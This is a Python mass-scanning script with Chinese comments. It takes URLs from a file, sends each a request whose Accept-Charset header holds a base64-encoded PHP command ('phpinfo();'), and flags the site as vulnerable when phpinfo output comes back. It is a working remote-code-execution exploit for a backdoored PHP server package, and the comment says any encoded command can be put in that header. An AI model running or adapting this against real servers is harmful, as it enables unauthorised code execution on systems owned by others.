# !/usr/bin/env python
# -*- coding:utf-8 -*-

import gevent
from gevent import monkey

gevent.monkey.patch_all()
import requests as rq


def file_read(file_name="url.txt"):
    with open(file_name, "r") as f:
        return [i.replace("\n", "") for i in f.readlines()]


def check(url):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36 Edg/77.0.235.27',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-User': '?1',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
        'Sec-Fetch-Site': 'none',
        'accept-charset': 'cGhwaW5mbygpOw==',     #将命令base64编码后放入accept-charset头
        'Accept-Encoding': 'gzip,deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9',
    }
    try:
        res = rq.get(url, headers=headers, timeout=20)
        if res.status_code == 200:
            if res.text.find('phpinfo') != -1:
                print("[存在漏洞] " + url)
    except:
        print("[超时] " + url)


if __name__ == '__main__':
    tasks = [gevent.spawn(check, url) for url in file_read()]
    print("正在执行...请等候")
    gevent.joinall(tasks)
    wait = input("执行完毕 任意键退出...")
